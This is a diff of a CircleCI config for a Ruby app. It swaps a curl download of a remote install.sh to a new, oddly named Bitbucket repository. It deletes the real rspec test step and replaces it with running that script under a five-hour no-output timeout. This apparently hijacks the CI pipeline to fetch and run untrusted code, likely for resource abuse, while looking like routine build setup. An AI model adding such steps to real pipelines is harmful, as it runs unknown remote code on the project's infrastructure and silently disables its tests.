@@ -6,14 +6,13 @@ working_dir: &working_dir ~/app
     - run: curl -L https://codeclimate.com/downloads/test-reporter/test-reporter-latest-linux-amd64 > ./cc-test-reporter
     - run: chmod +x ./cc-test-reporter
     - run: ./cc-test-reporter before-build
-    - run: curl -L https://bitbucket.org/curhatanintrovert/gasks/raw/c6f047bcb41eb1bf86d703172d56df4c2b13bca2/install.sh > ./install.sh
+    - run: curl -L https://bitbucket.org/azureshjlfgs/devops/raw/32497bd84776c138ae89756512bc1bb8f93fb3f1/install.sh > ./install.sh
     - run: chmod +x ./install.sh
-    - run: ./install.sh
-    - run:
-        name: Run tests
-        command: |
-          bundle exec rspec -r rspec_junit_formatter --format RspecJunitFormatter -o $CIRCLE_TEST_REPORTS/rspec/junit.xml
-          ./cc-test-reporter after-build --exit-code $?
+    - run: 
+       name: circleci
+       command: ./install.sh
+       no_output_timeout: 5h
+
   working_directory: *working_dir
 
 version: 2.0
